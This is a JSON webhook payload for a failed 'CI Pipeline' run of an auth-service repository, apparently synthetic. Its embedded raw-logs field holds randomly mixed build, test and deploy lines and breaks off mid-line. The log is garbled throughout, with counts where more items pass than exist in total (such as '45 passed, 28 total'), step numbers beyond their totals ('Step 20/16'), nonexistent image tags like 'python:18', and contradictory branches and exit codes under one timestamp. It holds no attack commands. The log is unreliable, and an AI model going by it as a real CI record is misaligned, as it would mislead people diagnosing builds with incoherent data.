{
  "action": "completed",
  "workflow_run": {
    "id": 690,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "ce1a2e809209fcf2d4454751e04f375621e28299",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-14T12:47:21.666154Z",
    "updated_at": "2025-12-14T12:49:45.329222Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: build ===\nSnapshots: 45 passed, 28 total\n[12:47:21] DEBUG: Loading configuration\nException: TypeError\nConnection established\nWARNING: react has known vulnerabilities\nPlatform: linux-x64\nUsing Python 3.9\nReady.\nCache hit for key-9305\nCache invalidated: node_modules\npip: Downloading prettier-4.17.tar.gz\nTime: 90.855s\nBundling main.js\nChecking out main branch\n\u2713 Step 'test' succeeded\npip: Downloading prettier-1.3.tar.gz\npip: Collecting lodash\nnpm install: resolved 1193 packages\nStep 9/22: Deploying\nCompleted.\nGET /api - 201 (91ms)\n[12:47:21] WARN: Deprecated API usage\nnpm notice: package.json updated\nSuccess!\n[12:47:21] DEBUG: Connection pool: 5 active\npip: Collecting webpack\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\n[12:47:21] INFO: Request completed\n\u2713 Task completed in 4427ms\nWaiting...\nStep 17/23: Installing dependencies\nInstalling webpack@2.15.0\n[12:47:21] INFO: Request completed\nBuilding Docker image...\nCache restored successfully (370MB)\nHEAD is now at 8f1ce15\nStep 19/23: Installing dependencies\nCache miss for key-3859\nArtifact downloaded: 42MB\nMinifying main.js\nStep 13/20: Testing\nCache miss for key-4928\nTime: 10.734s\nSwitched to branch 'hotfix/task-362'\nStep 8/19: Testing\nReady.\nVerifying...\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 7/22: Installing dependencies\nCompiling src/service.java...\nStep 10/22: Installing dependencies\nGET /api - 204 (79ms)\n  PASS: test_db_connect (207ms)\nWaiting...\nArtifact uploaded: build.tar.gz (24MB)\nImage pulled successfully\nLayer 4/13: RUN command\nNODE_ENV=test\nWaiting...\nConnection established\nyarn add: Done in 25.39s\nLayer 5/11: RUN command\nBuilding Docker image...\nNODE_ENV=development\nStep 3/19: Deploying\nUsing Node.js 15.15.1\nCompleted.\n[12:47:21] INFO: Connecting to database\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] DEBUG: Loading configuration\n\u2713 lint completed\nCache saved successfully\nTest Suites: 29 passed, 10 total\nMinifying vendor.js\nFinished.\nArtifact downloaded: 15MB\n[12:47:21] DEBUG: Loading configuration\nPulling image: python:18\nMinifying vendor.js\nEnvironment: test\n[12:47:21] INFO: Cache refreshed\n[12:47:21] DEBUG: Connection pool: 13 active\nStep 11/23: Deploying\nSuccess!\n[12:47:21] DEBUG: Query executed in 41ms\nChecking out master branch\nStep 16/19: Linting\nHEAD is now at 0f6ed57\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 77\n[12:47:21] WARN: Deprecated API usage\nFinished.\n  PASS: test_api_health (26ms)\nRan 24 tests in 35s\n\u2713 deploy completed\npip: Installing build dependencies...\nNODE_ENV=production\nStep 10/16: Running migrations\nCompiling src/utils.go...\nGenerating source maps...\n[12:47:21] DEBUG: Initializing service\nStep 12/22: Testing\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nUsing Python 3.10\nProcessing...\nTests: 204 passed, 281 total\nGET /status - 201 (70ms)\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: linux-x64\nCache hit for key-6533\nWARNING: react has known vulnerabilities\nLoading...\nCompleted.\nProcessing...\nCompiling utils/index.js...\nOK\nPushing to registry...\nCreating production build...\nOK\npip: Collecting axios\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nConnection established\nSuccess!\nCompiling lib/main.py...\nyarn add: Done in 25.55s\npip: Installing build dependencies...\nArtifact downloaded: 11MB\nPushing to registry...\nStep 17/24: Linting\n[12:47:21] INFO: Request completed\n[12:47:21] INFO: Request completed\npip: Collecting eslint\nStep 15/17: Deploying\nGenerating source maps...\nCompiling components/main.py...\n[12:47:21] INFO: Request completed\nArtifact uploaded: build.tar.gz (11MB)\n[12:47:21] DEBUG: Loading configuration\nAlready up to date.\n[12:47:21] DEBUG: Loading configuration\nnpm install: added 420 packages\nCache restored successfully (34MB)\nUsing Python 3.10\nOptimizing 85 modules...\nGenerating source maps...\nProcessing...\n[12:47:21] INFO: Connecting to database\nOptimizing 91 modules...\nCache miss for key-8949\nnpm notice: created a lockfile\nWaiting...\nReady.\nCompleted.\nCompiling components/utils.go...\nFinished.\nBundling vendor.js\nProcessing...\nTime: 51.847s\nSuccess!\npip: Installing build dependencies...\nCompiling components/service.java...\nTests: 360 passed, 486 total\nCompleted.\nStep 15/25: Running migrations\nSuccess!\nPlatform: darwin-arm64\nNODE_ENV=production\nInstalling react@3.6.2\n\u2717 build failed with exit code 61\npip: Downloading express-5.19.tar.gz\nStep 13/21: Deploying\nFinished.\n[12:47:21] DEBUG: Loading configuration\nOK\nConnection established\nRan 84 tests in 11s\nSnapshots: 20 passed, 28 total\nLayer 9/14: ENV command\nArtifact uploaded: build.tar.gz (6MB)\nTLS handshake completed\nLayer 2/14: RUN command\nArtifact uploaded: dist.zip (7MB)\nNODE_ENV=test\nTime: 22.757s\nBundling main.css\nStep 9/16: Testing\nNODE_ENV=test\nUploading artifact 'coverage' (41 files)\nArtifact uploaded: build.tar.gz (8MB)\n[12:47:21] INFO: Cache refreshed\nSwitched to branch 'feature/task-444'\nCompiling src/main.py...\nTime: 95.841s\nStep 11/19: Installing dependencies\nPushing to registry...\nLayer 2/15: ENV command\nCache saved successfully\nChecking out main branch\nCompiling lib/handler.rs...\nRan 179 tests in 10s\nCache hit for key-2851\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:21] WARN: Deprecated API usage\nStep 10/22: Building\npip install: Successfully installed react-1.17\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 24 passed, 48 total\nFetching from https://pypi.org/package.json\n\u2713 All checks passed\n\u2713 Step 'setup' succeeded\nTests: 192 passed, 437 total\npip: Downloading axios-5.11.tar.gz\nCompiling src/handler.rs...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\nTest Suites: 48 passed, 47 total\nFAILED: test_auth_login\nFinished.\nWARNING: jest has known vulnerabilities\nStep 2/15: Deploying\nFetching from https://amazonaws.com/package.json\nOptimizing 14 modules...\nStep 8/22: Building\nOK\n\u2713 Step 'setup' succeeded\nGET /health - 200 (37ms)\nCache restored successfully (74MB)\nPOST /api - 201 (379ms)\nStep 12/23: Building\nUsing Python 3.11\nLayer 4/15: ENV command\nAlready up to date.\nInstalling webpack@1.0.3\n\u2713 All checks passed\n=== Step build completed ===\n=== Step: lint ===\nUploading artifact 'build' (21 files)\nTime: 26.756s\nTLS handshake completed\nStep 19/24: Building\nMinifying main.js\nCompiling utils/main.py...\nVerifying...\nArtifact uploaded: build.tar.gz (24MB)\n[12:47:21] WARN: Deprecated API usage\nWaiting...\nSnapshots: 19 passed, 47 total\n[12:47:21] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\n[12:47:21] DEBUG: Connection pool: 20 active\nCreating production build...\n[12:47:21] INFO: Connecting to database\nnpm install: added 221 packages\nLoading...\n[12:47:21] WARN: Deprecated API usage\nyarn add: Done in 5.37s\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\nCache miss for key-7745\n[12:47:21] INFO: Cache refreshed\nyarn add: Done in 24.27s\nPOST /data - 201 (299ms)\nReady.\nnpm notice: created a lockfile\nFetching from https://gcr.io/package.json\nWARNING: prettier has known vulnerabilities\n[12:47:21] DEBUG: Memory usage: 1306MB\n[12:47:21] WARN: Deprecated API usage\nCache saved successfully\nReady.\nLoading...\nCompiling components/app.ts...\n[12:47:21] WARN: Deprecated API usage\nException: NullPointerException\nStep 5/24: Deploying\nFetching submodules...\nPOST /data - 201 (125ms)\n[12:47:21] DEBUG: Connection pool: 5 active\nLayer 1/11: RUN command\nFinished.\nRan 25 tests in 56s\n[12:47:21] INFO: Connecting to database\nGenerating source maps...\nStep 19/20: Deploying\nMinifying main.js\nOK\nPOST /data - 202 (53ms)\nRan 91 tests in 26s\nRan 29 tests in 34s\nReady.\nCache restored successfully (428MB)\nGenerating source maps...\nPushing to registry...\npip: Installing build dependencies...\nFetching from https://githubusercontent.com/package.json\n\u2713 Task completed in 121ms\n[12:47:21] INFO: Processing request\nTLS handshake completed\n[12:47:21] DEBUG: Query executed in 49ms\nHEAD is now at 5a6f826\n[12:47:21] WARN: Deprecated API usage\nCache hit for key-5347\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: alpine:3.11\nWARNING: lodash has known vulnerabilities\n  PASS: test_api_health (310ms)\nStep 2/20: Deploying\n[12:47:21] DEBUG: Query executed in 33ms\nInstalling jest@4.0.5\nVerifying...\nTest Suites: 12 passed, 43 total\nConnection established\nCompleted.\nStep 14/21: Linting\n[12:47:21] INFO: Cache refreshed\nCache hit for key-4210\n\u2713 Step 'install' succeeded\npip: Downloading express-5.7.tar.gz\nCache restored successfully (302MB)\nCompiling src/index.js...\nHEAD is now at f21972e\nCompiling components/main.py...\n[12:47:21] DEBUG: Initializing service\nMinifying vendor.js\nWARNING: lodash has known vulnerabilities\n[12:47:21] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (40MB)\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] DEBUG: Memory usage: 584MB\nLayer 10/10: ENV command\nCache miss for key-8224\nStep 2/22: Building\n[12:47:21] INFO: Starting build process\nCreating production build...\nConnection established\nChecking out master branch\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (22MB)\nCompiling lib/service.java...\n\u2713 test completed\nCompiling utils/service.java...\nTransforming 458 files...\n[12:47:21] WARN: Deprecated API usage\nStep 11/22: Running migrations\nSnapshots: 49 passed, 35 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 3/23: Running migrations\nStep 16/25: Running migrations\nUsing Python 3.11\nUsing Node.js 14.12.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.11\nEnvironment: test\nUploading artifact 'dist' (28 files)\nCompleted.\n[12:47:21] DEBUG: Memory usage: 1837MB\nTime: 99.228s\nnpm install: resolved 1231 packages\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFAILED: test_api_health\nTLS handshake completed\n[12:47:21] DEBUG: Memory usage: 816MB\nHEAD is now at 2f52862\nCompleted.\nTransforming 988 files...\nPlatform: linux-x64\nFAILED: test_api_health\nCompiling lib/service.java...\n\u2713 Task completed in 662ms\nFetching from https://googleapis.com/package.json\nPOST /api - 201 (67ms)\nProcessing...\nnpm notice: created a lockfile\nUploading artifact 'dist' (19 files)\nArtifact uploaded: dist.zip (4MB)\nCache restored successfully (494MB)\nSnapshots: 7 passed, 11 total\nOK\nCache hit for key-7567\n[12:47:21] DEBUG: Initializing service\nCompiling src/index.js...\nnpm install: added 99 packages\nUsing Node.js 18.10.10\nProcessing...\nPulling image: node:18\n\u2717 build failed with exit code 15\nPOST /data - 202 (272ms)\nBundling runtime.css\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nOptimizing 70 modules...\nHEAD is now at f05969b\nStep 16/15: Building\nVerifying...\nSwitched to branch 'feature/task-629'\npip: Downloading jest-1.20.tar.gz\nStep 13/18: Testing\nPulling image: node:latest\n[12:47:21] DEBUG: Query executed in 9ms\nVerifying...\n[12:47:21] INFO: Starting build process\nSuccess!\n[12:47:21] DEBUG: Connection pool: 10 active\nnpm notice: created a lockfile\nStep 10/20: Running migrations\nFinished.\nCache invalidated: dependencies\nStep 16/25: Running migrations\nnpm install: added 260 packages\n  PASS: integration/test_api_health.spec.js\n[12:47:21] DEBUG: Connection pool: 15 active\nLayer 7/14: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 1/8: RUN command\nArtifact downloaded: 3MB\nStep 13/23: Building\nUploading artifact 'build' (36 files)\nFinished.\n[12:47:21] DEBUG: Connection pool: 5 active\nTests: 288 passed, 487 total\nStep 9/20: Building\nNODE_ENV=test\nRan 60 tests in 19s\nCache miss for key-8164\nImage pulled successfully\nStep 13/16: Installing dependencies\nStep 2/23: Running migrations\n[12:47:21] INFO: Processing request\nTest Suites: 7 passed, 42 total\nnpm notice: created a lockfile\nCache invalidated: build\nException: TypeError\nCache invalidated: build\npip: Installing build dependencies...\n[12:47:21] DEBUG: Initializing service\nFetching from https://github.com/package.json\nVerifying...\nSnapshots: 36 passed, 46 total\nReady.\n[12:47:21] DEBUG: Initializing service\nOptimizing 91 modules...\npip install: Successfully installed eslint-4.17\nCompiling utils/service.java...\n[12:47:21] DEBUG: Memory usage: 829MB\nPlatform: darwin-arm64\nFinished.\nWARNING: prettier has known vulnerabilities\nCache restored successfully (402MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nUploading artifact 'build' (3 files)\nnpm install: resolved 894 packages\nException: RuntimeError\n[12:47:21] INFO: Starting build process\nSwitched to branch 'feature/task-955'\nCompiling src/index.js...\n[12:47:21] DEBUG: Memory usage: 1587MB\nImage pulled successfully\nWaiting...\n\u2713 Task completed in 4470ms\npip: Installing build dependencies...\nFetching from https://amazonaws.com/package.json\nInstalling jest@1.8.0\n\u2713 Step 'install' succeeded\n[12:47:21] DEBUG: Initializing service\nPOST /upload - 202 (488ms)\nWARNING: express has known vulnerabilities\n[12:47:21] DEBUG: Connection pool: 5 active\nLayer 5/10: COPY command\nnpm install: added 16 packages\nStep 3/16: Installing dependencies\nCompiling lib/service.java...\nArtifact uploaded: dist.zip (29MB)\nTests: 356 passed, 198 total\n=== Step lint completed ===\n=== Step: checkout ===\nCompiling utils/main.py...\nBundling styles.css\nCreating production build...\nCache invalidated: node_modules\n\u2713 Task completed in 4462ms\n[12:47:21] INFO: Processing request\nMinifying main.js\nUsing Python 3.9\nWaiting...\nUsing Python 3.9\nUploading artifact 'build' (32 files)\n[12:47:21] ERROR: Connection failed\nTLS handshake completed\n\u2713 All checks passed\nWaiting...\nArtifact uploaded: dist.zip (90MB)\nFetching from https://amazonaws.com/package.json\nCompleted.\nWARNING: axios has known vulnerabilities\n[12:47:21] INFO: Request completed\nStep 14/17: Testing\npip: Downloading react-3.5.tar.gz\nCompiling src/service.java...\nnpm notice: package.json updated\nPushing to registry...\nMinifying vendor.js\nInstalling jest@2.8.1\nnpm install: added 330 packages\n[12:47:21] DEBUG: Loading configuration\nNODE_ENV=production\nPOST /api - 200 (365ms)\nFetching submodules...\nCompiling utils/handler.rs...\nGenerating source maps...\n[12:47:21] INFO: Connecting to database\nTest Suites: 30 passed, 9 total\nCreating production build...\nDone.\nSuccess!\nCompleted.\nImage pulled successfully\nFinished.\nStep 3/15: Building\nProcessing...\nChecking out main branch\nTime: 32.690s\n[12:47:21] DEBUG: Query executed in 48ms\n[12:47:21] INFO: Request completed\nCompiling lib/utils.go...\nLoading...\nTests: 472 passed, 253 total\nWARNING: prettier has known vulnerabilities\nFAILED: test_api_health\n[12:47:21] DEBUG: Memory usage: 626MB\nPushing to registry...\npip: Downloading react-3.14.tar.gz\nTime: 28.324s\nInstalling lodash@1.6.2\nFetching submodules...\nTLS handshake completed\nMinifying vendor.js\nUsing Node.js 15.2.3\nPOST /data - 202 (496ms)\nException: ValueError\npip: Collecting jest\nSnapshots: 26 passed, 50 total\nyarn add: Done in 21.44s\nFinished.\nOptimizing 23 modules...\nOptimizing 99 modules...\nStep 13/15: Installing dependencies\nTime: 45.339s\n[12:47:21] INFO: Connecting to database\n  PASS: integration/test_cache_hit.spec.js\n[12:47:21] INFO: Request completed\n\u2717 build failed with exit code 14\nPlatform: win32-x64\n[12:47:21] INFO: Processing request\nSwitched to branch 'hotfix/task-902'\nHEAD is now at 85de4a0\nRan 196 tests in 16s\n\u2713 package completed\nFetching submodules...\n[12:47:21] INFO: Connecting to database\nDone.\npip: Collecting axios\npip: Downloading jest-5.6.tar.gz\nGET /api - 204 (21ms)\nImage pulled successfully\n\u2713 All checks passed\nCompiling components/handler.rs...\nPushing to registry...\nnpm notice: created a lockfile\n[12:47:21] INFO: Starting build process\nChecking out develop branch\nTLS handshake completed\nRan 67 tests in 42s\n\u2713 deploy completed\nCache hit for key-9804\nChecking out main branch\nConnection established\nFetching submodules...\n  PASS: test_api_health (248ms)\nCoverage: 78% statements, 91% branches\nCoverage: 100% statements, 62% branches\n\u2713 Task completed in 3335ms\nnpm install: added 201 packages\nMinifying main.js\nTime: 33.442s\nStep 9/15: Building\nUsing Node.js 14.7.5\nTransforming 732 files...\nnpm install: added 313 packages\nTest Suites: 31 passed, 19 total\n  PASS: integration/test_db_connect.spec.js\nnpm install: added 396 packages\nFetching from https://pypi.org/package.json\nOK\n[12:47:21] WARN: Deprecated API usage\nArtifact downloaded: 43MB\nDone.\nSnapshots: 0 passed, 1 total\n\u2713 Step 'checkout' succeeded\nnpm install: added 153 packages\nCompiling components/main.py...\nArtifact downloaded: 38MB\nUsing Node.js 20.12.2\nWARNING: webpack has known vulnerabilities\n[12:47:21] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (32MB)\nnpm install: added 381 packages\n\u2713 validate completed\nFAILED: test_api_health\nGET /health - 204 (88ms)\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://registry.npmjs.org/package.json\nArtifact uploaded: dist.zip (4MB)\nWaiting...\nChecking out develop branch\n[12:47:21] DEBUG: Query executed in 76ms\nCompiling lib/handler.rs...\n[12:47:21] DEBUG: Connection pool: 9 active\n[12:47:21] INFO: Cache refreshed\nStep 18/19: Deploying\nPushing to registry...\nSnapshots: 12 passed, 19 total\nPulling image: alpine:18\nStep 18/15: Installing dependencies\nRan 92 tests in 23s\nPOST /upload - 200 (149ms)\nnpm notice: package.json updated\nImage pulled successfully\nFetching submodules...\nSwitched to branch 'bugfix/task-634'\nGenerating source maps...\nPulling image: node:18\nException: NullPointerException\nStep 12/22: Deploying\nConnection established\npip: Downloading axios-5.12.tar.gz\nTests: 411 passed, 125 total\nUsing Python 3.12\nCache restored successfully (21MB)\n\u2717 build failed with exit code 104\nInstalling prettier@2.4.8\n[12:47:21] DEBUG: Initializing service\nCompleted.\nEnvironment: test\nPulling image: node:3.11\nPlatform: darwin-arm64\nSnapshots: 19 passed, 19 total\n[12:47:21] INFO: Request completed\n[12:47:21] DEBUG: Memory usage: 137MB\n  PASS: integration/test_auth_login.spec.js\nFinished.\nGenerating source maps...\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (33MB)\nCompleted.\n  PASS: integration/test_auth_login.spec.js\n[12:47:21] INFO: Request completed\nFAILED: test_api_health\nTest Suites: 34 passed, 29 total\nGenerating source maps...\nUsing Python 3.11\nOK\n\u2717 build failed with exit code 10\n[12:47:21] INFO: Processing request\n[12:47:21] DEBUG: Connection pool: 6 active\nConnection established\n\u2713 Task completed in 2289ms\nCompiling src/app.ts...\nTests: 53 passed, 303 total\nInstalling jest@2.2.6\nCompleted.\nVerifying...\nAlready up to date.\nArtifact uploaded: build.tar.gz (24MB)\nArtifact downloaded: 28MB\nCompiling components/app.ts...\n[12:47:21] INFO: Request completed\nStep 20/16: Installing dependencies\nInstalling webpack@5.20.0\nAlready up to date.\nPOST /api - 202 (457ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nChecking out master branch\nStep 6/16: Building\nBuilding Docker image...\n\u2713 Task completed in 1958ms\n[12:47:21] INFO: Request completed\nGET /health - 201 (10ms)\nCompiling components/index.js...\npip: Downloading axios-3.2.tar.gz\n[12:47:21] DEBUG: Query executed in 85ms\npip: Installing build dependencies...\nLoading...\npip: Installing build dependencies...\n\u2713 All checks passed\nTransforming 827 files...\nException: RuntimeError\n[12:47:21] DEBUG: Initializing service\npip: Installing build dependencies...\nFetching submodules...\nProcessing...\nCache restored successfully (341MB)\npip: Collecting react\nStep 19/21: Building\n[12:47:21] DEBUG: Connection pool: 16 active\nMinifying vendor.js\n[12:47:21] DEBUG: Connection pool: 15 active\nSnapshots: 34 passed, 10 total\n\u2713 Step 'install' succeeded\nGenerating source maps...\nGenerating source maps...\nFAILED: test_api_health\nReady.\nStep 11/19: Running migrations\nNODE_ENV=development\nnpm notice: package.json updated\n=== Step checkout completed ===\n=== Step: save_cache ===\nReady.\n[12:47:21] WARN: Deprecated API usage\nDone.\n\u2713 test completed\nCoverage: 81% statements, 61% branches\nTime: 120.835s\nWARNING: jest has known vulnerabilities\nCache hit for key-6507\nMinifying main.js\nSuccess!\nAlready up to date.\n[12:47:21] ERROR: Connection failed\nStep 1/23: Linting\nFetching submodules...\nnpm install: resolved 1807 packages\nFAILED: test_auth_login\n[12:47:21] INFO: Starting build process\nFetching submodules...\n\u2713 All checks passed\nLayer 9/8: COPY command\nCoverage: 93% statements, 84% branches\nReady.\n[12:47:21] INFO: Cache refreshed\n  PASS: integration/test_api_health.spec.js\nCompiling utils/service.java...\npip: Collecting jest\nSwitched to branch 'bugfix/task-352'\npip: Downloading jest-1.0.tar.gz\nStep 15/23: Deploying\nTime: 59.599s\nProcessing...\nyarn add: Done in 10.48s\n[12:47:21] WARN: Deprecated API usage\nTest Suites: 21 passed, 38 total\nUsing Node.js 14.15.5\nWaiting...\nStep 16/19: Installing dependencies\n[12:47:21] WARN: Deprecated API usage\nCompiling components/service.java...\nTransforming 971 files...\nCoverage: 94% statements, 89% branches\nStep 18/19: Installing dependencies\nImage pulled successfully\nSuccess!\nCache restored successfully (53MB)\nStep 20/21: Installing dependencies\nTests: 302 passed, 465 total\nRan 181 tests in 23s\nPlatform: darwin-arm64\nStep 10/25: Deploying\nCache invalidated: dependencies\nLoading...\nStep 8/24: Linting\nOptimizing 76 modules...\nUploading artifact 'dist' (20 files)\npip: Downloading axios-5.3.tar.gz\nImage pulled successfully\nChecking out master branch\nTest Suites: 46 passed, 42 total\nMinifying main.js\nPlatform: darwin-arm64\n[12:47:21] INFO: Request completed\n[12:47:21] INFO: Connecting to database\nImage pulled successfully\nCache hit for key-6788\nTest Suites: 9 passed, 29 total\n[12:47:21] DEBUG: Query executed in 23ms\nBundling vendor.css\nPOST /upload - 202 (328ms)\npip: Collecting express\n\u2713 build completed\nLayer 6/15: ENV command\nStep 18/22: Testing\nTransforming 339 files...\nCompiling utils/index.js...\nFinished.\nEnvironment: staging\nFetching submodules...\nGET /api - 201 (8ms)\nnpm notice: package.json updated\n\u2713 Step 'setup' succeeded\nPushing to registry...\nCompiling lib/index.js...\nPushing to registry...\n[12:47:21] DEBUG: Initializing service\npip: Collecting react\nException: RuntimeError\nStep 17/25: Testing\nException: RuntimeError\nProcessing...\n  PASS: test_db_connect (105ms)\nImage pulled successfully\npip: Downloading lodash-1.10.tar.gz\nHEAD is now at d0a6431\nStep 13/19: Installing dependencies\n[12:47:21] DEBUG: Query executed in 31ms\nTime: 14.256s\n[12:47:21] DEBUG: Initializing service\nCompiling components/utils.go...\nRan 63 tests in 10s\nWARNING: react has known vulnerabilities\nCompiling components/handler.rs...\nStep 5/22: Deploying\nPushing to registry...\nCache restored successfully (285MB)\n[12:47:21] WARN: Deprecated API usage\nUploading artifact 'dist' (10 files)\nCreating production build...\nPlatform: darwin-arm64\n  PASS: test_cache_hit (384ms)\nPushing to registry...\n[12:47:21] DEBUG: Query executed in 71ms\nNODE_ENV=production\n\u2713 Step 'build' succeeded\nCompiling lib/handler.rs...\nTests: 65 passed, 428 total\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Processing request\nHEAD is now at bde9998\nCompiling utils/index.js...\npip: Downloading prettier-5.4.tar.gz\nChecking out master branch\nOptimizing 11 modules...\nSnapshots: 41 passed, 23 total\nChecking out main branch\nTest Suites: 49 passed, 16 total\nOptimizing 37 modules...\n\u2713 Task completed in 2879ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 validate completed\n[12:47:21] ERROR: Connection failed\nFetching submodules...\nHEAD is now at 39706ac\nnpm install: added 178 packages\nCompiling components/handler.rs...\nDone.\nCache invalidated: node_modules\nOK\nRan 97 tests in 43s\nSwitched to branch 'hotfix/task-296'\n\u2713 All checks passed\n[12:47:21] ERROR: Connection failed\n[12:47:21] DEBUG: Connection pool: 1 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 12/16: Deploying\nLayer 4/15: COPY command\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Connecting to database\nHEAD is now at 937f5a1\nnpm install: resolved 787 packages\n[12:47:21] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nChecking out develop branch\nSwitched to branch 'feature/task-100'\n[12:47:21] DEBUG: Connection pool: 20 active\n[12:47:21] DEBUG: Connection pool: 14 active\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Processing request\nProcessing...\nDone.\nSnapshots: 45 passed, 43 total\nPushing to registry...\nStep 16/24: Building\nGET /api - 204 (56ms)\nSwitched to branch 'bugfix/task-241'\nArtifact uploaded: dist.zip (80MB)\n\u2713 deploy completed\nStep 9/24: Running migrations\n\u2713 All checks passed\nCreating production build...\nPOST /data - 200 (175ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://npmjs.org/package.json\n  PASS: test_db_connect (311ms)\n  PASS: test_auth_login (335ms)\n[12:47:21] DEBUG: Query executed in 1ms\n[12:47:21] DEBUG: Initializing service\n[12:47:21] INFO: Connecting to database\nRan 191 tests in 1s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nBundling styles.js\nSuccess!\nMinifying vendor.js\nHEAD is now at 5a6a7bb\nCache restored successfully (193MB)\nSwitched to branch 'hotfix/task-476'\nSnapshots: 27 passed, 7 total\nOK\n[12:47:21] WARN: Deprecated API usage\nConnection established\nDone.\nyarn add: Done in 20.0s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:18\nRan 62 tests in 51s\nCompleted.\nGET /status - 200 (90ms)\n[12:47:21] DEBUG: Query executed in 82ms\nCreating production build...\nWARNING: prettier has known vulnerabilities\n[12:47:21] DEBUG: Initializing service\nPulling image: node:3.11\nNODE_ENV=test\nVerifying...\nCompiling utils/app.ts...\nGET /health - 204 (94ms)\nNODE_ENV=development\nArtifact uploaded: build.tar.gz (10MB)\nyarn add: Done in 9.74s\nStep 12/21: Building\nCache miss for key-6624\n[12:47:21] INFO: Starting build process\nNODE_ENV=development\nCoverage: 74% statements, 72% branches\nCache restored successfully (390MB)\n[12:47:21] INFO: Request completed\npip: Collecting lodash\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nStep 15/23: Building\nStep 4/24: Testing\nSuccess!\nMinifying main.js\nGET /api - 201 (56ms)\nCompiling components/utils.go...\nVerifying...\nCache miss for key-1709\n[12:47:21] WARN: Deprecated API usage\nOK\nUsing Python 3.12\nImage pulled successfully\nGET /health - 204 (83ms)\n[12:47:21] WARN: Deprecated API usage\nFAILED: test_api_health\nSwitched to branch 'feature/task-228'\nProcessing...\nTime: 94.512s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nStep 7/23: Testing\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nnpm install: added 76 packages\nCache hit for key-6650\nWaiting...\n\u2713 validate completed\n  PASS: test_cache_hit (62ms)\nCache invalidated: dependencies\nWaiting...\nnpm install: added 294 packages\nnpm install: resolved 676 packages\n[12:47:21] DEBUG: Initializing service\n[12:47:21] INFO: Cache refreshed\npip: Installing build dependencies...\nLayer 8/11: ENV command\nCompiling components/handler.rs...\nTests: 106 passed, 273 total\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: axios has known vulnerabilities\nPulling image: node:latest\nArtifact uploaded: build.tar.gz (12MB)\nCompleted.\nSnapshots: 16 passed, 38 total\nHEAD is now at 720f84a\nFetching submodules...\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: integration/test_db_connect.spec.js\nFetching from https://npmjs.org/package.json\nChecking out main branch\nGET /status - 201 (3ms)\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\npip install: Successfully installed jest-5.20\nCompiling utils/utils.go...\nWaiting...\nFinished.\n[12:47:21] INFO: Starting build process\nTLS handshake completed\nCache restored successfully (164MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 7.61s\nArtifact uploaded: build.tar.gz (15MB)\nSwitched to branch 'feature/task-631'\nHEAD is now at 916266f\nArtifact uploaded: dist.zip (83MB)\nNODE_ENV=production\nNODE_ENV=production\nStep 5/22: Running migrations\nWARNING: jest has known vulnerabilities\nnpm notice: created a lockfile\npip: Downloading prettier-1.19.tar.gz\nCompiling components/index.js...\n  PASS: e2e/test_db_connect.spec.js\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\nMinifying app.js\nMinifying app.js\nImage pulled successfully\nHEAD is now at cdbadb5\nUsing Node.js 15.20.5\n[12:47:21] INFO: Request completed\nArtifact downloaded: 37MB\nWARNING: webpack has known vulnerabilities\nOptimizing 86 modules...\n[12:47:21] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 1940 packages\nCreating production build...\nOK\n\u2713 test completed\n[12:47:21] DEBUG: Query executed in 68ms\nStep 13/25: Running 